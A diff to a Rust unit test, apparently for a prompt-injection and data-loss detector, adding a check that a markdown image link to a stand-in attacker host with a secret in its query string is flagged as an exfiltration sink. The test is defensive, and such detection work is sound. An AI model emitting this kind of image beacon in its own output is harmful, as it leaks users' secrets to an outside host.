@@ -656,7 +656,16 @@ fn rule_gates_filter_individual_dlp_and_injection_rules() {
         .evidence_spans
         .iter()
         .all(|span| span.label != "ark.injection.override.discard_prior"));
-    assert!(aggregate("exfiltration")
+    // Behind a negated sentence the exfiltration class sees a counter context;
+    // the beacon alone still reports.
+    let exfiltration = injection.scan_category(
+        SecurityCategory::Exfiltration,
+        "![x](https://attacker.test/pixel?value=secret)",
+    );
+    assert!(exfiltration
+        .iter()
+        .find(|result| result.model == "native:injection_l1")
+        .expect("exfiltration Injection L1 aggregate must be present")
         .evidence_spans
         .iter()
         .any(|span| span.label == "ark.injection.exfil.external_sink"));
